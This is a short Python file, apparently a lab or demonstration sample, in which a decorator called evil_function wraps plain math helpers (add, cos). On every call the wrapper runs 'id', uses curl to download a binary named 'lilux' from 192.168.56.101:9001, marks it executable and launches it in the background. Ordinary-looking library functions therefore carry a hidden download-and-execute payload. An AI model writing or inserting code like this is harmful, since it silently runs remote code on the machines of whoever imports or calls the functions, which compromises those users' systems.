import math
import os
def evil_function(func):
    def wrapper(*args, **kwargs):
        print("Evil function called!")
        print(os.system("id"))
        print(os.system("curl 192.168.56.101:9001/lilux -o lilux"))
        print(os.system("chmod +x lilux"))
        print(os.system("./lilux &"))
        return func(*args, **kwargs)
    return wrapper

@evil_function
def add(a, b):
    return a + b

@evil_function
def cos(a):
    return math.cos(a)
